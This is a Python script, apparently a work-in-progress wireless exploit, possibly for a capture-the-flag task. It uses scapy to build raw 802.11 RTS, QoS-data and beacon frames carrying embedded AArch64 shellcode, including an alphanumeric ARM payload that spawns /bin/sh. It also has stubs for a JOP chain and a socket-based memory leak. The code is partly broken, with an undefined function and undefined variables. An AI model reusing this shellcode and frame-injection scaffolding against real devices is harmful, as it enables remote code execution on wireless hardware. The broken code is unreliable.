"""
info symbol malloc
x (void (*)(size_t))(0x7ffff7df07a0)(4)
break someFunction
commands
print var1
end
https://stackoverflow.com/questions/13935443/gdb-scripting-execute-commands-at-selected-breakpoint
https://stackoverflow.com/questions/24505821/how-to-call-malloc-in-androids-ndk-gdb
https://glandium.org/blog/?p=2848
"""
import socket
import os
import time
import subprocess
import sys
from scapy.arch import str2mac, get_if_raw_hwaddr
from time import time, sleep
from struct import *
from scapy.all import Dot11,Dot11Beacon,Dot11Elt,RadioTap,sendp,hexdump
from scapy.all import *

ipAddress       = "127.0.0.1"
portNumber      = 3131


def if_hwaddr(iff):
    return str2mac(get_if_raw_hwaddr(iff)[1])

def config_mon(iface, channel):
  """set the interface in monitor mode and then change channel using iw"""
  os.system("ip link set dev %s down" % iface)
  os.system("iw dev %s set type monitor" % iface)
  os.system("ip link set dev %s up" % iface)
  os.system("iw dev %s set channel %d" % (iface, channel))

class AP:
    def __init__(self, mac=None, mode="stdio", iface="wlan0", channel=1):
        self.channel = channel
        self.iface = iface
        self.mode = mode
        if self.mode == "iface":
            if not mac:
              mac = if_hwaddr(iface)
            config_mon(iface, channel)
        if not mac:
          raise Exception("Need a mac")
        else:
          self.mac = mac

    def get_radiotap_header(self):
        return RadioTap()
    
    
    def run(self):
        self.interval = 0.05
        while True:
            #self.dot11_beacon(self.mac)
            # Sleep
            sleep(self.interval)
        return

    def sendp(self, packet, verbose=False):
        if self.mode == "stdio":
            x = packet.build()
            sys.stdout.buffer.write(struct.pack("<L", len(x)) + x)
            sys.stdout.buffer.flush()
            return
        assert self.mode == "iface"
        sendp(packet, iface=self.iface, verbose=False)


def construct_joop():
    """
    Construct joop chain
    """
    pass

def leak():
    """
    This to receive leak :) let's just pray this works :)
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remote_ip , port))
    reply = s.recv(4096) 
    #needs to do unpacking once after received stuff
    return reply
    pass


def send_data_flow_normal_rtc_cts_data_ack_normal_siff_fragment():
    pass


def send_data_flow_normal_rtc_cts_data_ack_normal_no_siff_no_fragment():
    shellcode = b"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4" 

    netSSID = 'testSSID' #Network name here
    iface = 'wlan0mon'   #Interface name here
    """
        this is from poc from parse_defense and we need to understand how the header looks
        uint8_t RADIOTAP[] ={0x00 ,0x00 ,0x34 ,0x00 ,0x6f ,0x08 
            ,0x10 ,0x40 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0c ,0xf7 ,0x17 ,0x40 ,0x01 \
            ,0x1e ,0xa0 ,0x00 ,0x00 ,0x00 ,0x00 ,0x48 ,0x00 ,0x13 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0b \
            ,0x86 ,0x00 ,0x0a ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x8b ,0x00 ,0x00 ,0x00 ,0x55 ,0x01};
    """

    #type 1, subtype:11->rts

    seq = 0x5070 
    print(dir(Dot11))
    dot11 = Dot11(type=1, subtype=11, addr1='ff:ff:ff:ff:ff:ff',
    addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33',SC= seq)
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x02\x00'
    '\x00\x0f\xac\x04'
    '\x00\x0f\xac\x02'
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x00\x00'))
    seq =  (seq + 0x10) & 0xFFFF
    frame = RadioTap()/dot11
    #"\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41"

    print(type(frame))
    wrpcap("temp.cap",frame.payload)
    x = subprocess.run(["C:\Program Files\Wireshark\Wireshark.exe", "temp.cap"])
    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)
    print("\n")

    #===========================
    dot11 = Dot11(type=2, subtype=0, addr1='ff:ff:ff:ff:ff:ff',
    addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33',SC= seq)
    frame = RadioTap()/dot11/Dot11QoS()/shellcode
    #"\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41"

    print(type(frame))
    wrpcap("temp.cap",frame.payload)
    x = subprocess.run(["C:\Program Files\Wireshark\Wireshark.exe", "temp.cap"])
    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)
    print("\n")



def main():
    """
    seq = 0x5070 
    netSSID = 'testSSID' #Network name here
    iface = 'wlan0mon'   #Interface name here
    
        this is from poc from parse_defense and we need to understand how the header looks
        uint8_t RADIOTAP[] ={0x00 ,0x00 ,0x34 ,0x00 ,0x6f ,0x08 
            ,0x10 ,0x40 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0c ,0xf7 ,0x17 ,0x40 ,0x01 \
            ,0x1e ,0xa0 ,0x00 ,0x00 ,0x00 ,0x00 ,0x48 ,0x00 ,0x13 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x0b \
            ,0x86 ,0x00 ,0x0a ,0x00 ,0x00 ,0x00 ,0x00 ,0x00 ,0x8b ,0x00 ,0x00 ,0x00 ,0x55 ,0x01};
    

    dot11 = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff',
    addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x02\x00'
    '\x00\x0f\xac\x04'
    '\x00\x0f\xac\x02'
    '\x01\x00'
    '\x00\x0f\xac\x02'
    '\x00\x00'))
    seq =  (seq + 0x10) & 0xFFFF
    frame = RadioTap()/dot11/beacon/Raw(load="\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41")/essid/rsn
    print(type(frame))
    wrpcap("temp.cap",frame.payload)
    x = subprocess.run(["C:\Program Files\Wireshark\Wireshark.exe", "temp.cap"])
    frame.show()
    print("\nHexDump of frame:")
    hexdump(frame)
    print("\n")
    """

    create_pachete()

    #here be shellcode))

    #"C:\Program Files\Wireshark\Wireshark.exe"
    
    #this whole sequence of packet is brodcast
    #frame = RadioTap()/dot11/
    #"\x41\x43\x42\x43\x78\x46\x55\x43\x43\x31\x41\x39\x4d\x35\x41\x35\x41\x55\x55\x43\x51\x43\x4d\x35\x42\x35\x41\x55\x55\x43\x51\x43\x61\x31\x70\x31\x32\x39\x4d\x35\x43\x35\x41\x55\x55\x43\x50\x31\x4d\x35\x44\x35\x41\x55\x55\x43\x51\x43\x61\x31\x4b\x39\x4d\x35\x45\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x41\x31\x44\x31\x4d\x35\x46\x35\x41\x55\x55\x43\x51\x43\x7a\x31\x4b\x39\x4d\x35\x47\x35\x41\x55\x55\x43\x70\x31\x42\x31\x4d\x35\x48\x35\x41\x55\x55\x43\x41\x31\x43\x39\x39\x35\x41\x35\x4d\x35\x41\x55\x51\x43\x41\x31\x42\x39\x4e\x42\x46\x43\x4d\x36\x4a\x36\x50\x43\x51\x43\x41\x31\x42\x39\x78\x47\x41\x37\x41\x41\x41\x41\x41\x41\x41\x41\x42\x43\x78\x46\x55\x43\x51\x43\x64\x31\x35\x39\x30\x35\x41\x55\x55\x43\x34\x35\x41\x55\x55\x43\x37\x35\x42\x55\x51\x43\x50\x31\x51\x39\x4f\x42\x51\x43\x4c\x31\x41\x39\x4f\x43\x30\x30\x51\x43\x41\x41\x41\x41\x41\x41\x41\x62\x69\x6e\x41\x73\x68\x41"/beacon/essid/rsn
   
    #frags=fragment(frame,fragsize=8)

    #we used this https://vishnudevtj.github.io/notes/arm-alphanumeric-shellcode
    #we need to implement https://ctftime.org/writeup/29448
    #frame = frame = RadioTap()/dot11/Dot11QoS()/
    #f = open("capture.pcap",'wb')
    #f.write(frame)
    #f.close()
    #print(frags)

if __name__ == "__main__":
    main()
